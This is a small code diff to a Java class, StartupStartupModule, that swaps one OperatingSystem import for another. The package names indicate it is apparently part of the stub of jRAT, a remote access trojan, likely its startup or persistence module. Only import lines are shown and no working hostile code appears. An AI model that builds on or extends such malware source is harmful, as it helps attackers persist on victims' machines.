@@ -4,10 +4,11 @@ import java.io.File;
 import java.util.Date;
 import java.util.Map;
 
-import se.jrat.common.OperatingSystem;
 import se.jrat.stub.Configuration;
 import se.jrat.stub.Startup;
 import se.jrat.stub.utils.Utils;
+
+import com.redpois0n.oslib.OperatingSystem;
 
 public class StartupStartupModule extends StartupModule {
 	
